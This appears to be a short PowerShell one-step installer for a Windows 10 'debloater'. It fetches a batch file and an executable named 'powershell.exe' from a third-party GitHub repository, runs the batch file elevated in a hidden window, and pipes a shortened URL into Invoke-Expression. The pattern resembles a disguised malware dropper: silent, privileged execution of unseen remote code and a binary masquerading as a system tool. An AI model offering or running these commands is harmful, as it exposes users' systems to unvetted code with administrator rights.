iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/debloat" -o $env:TEMP\cmd-debloat.bat
iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/powershell.exe" -o $env:TEMP\powershell.exe
Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\cmd-debloat.bat
iwr -useb git.io/debloat|iex
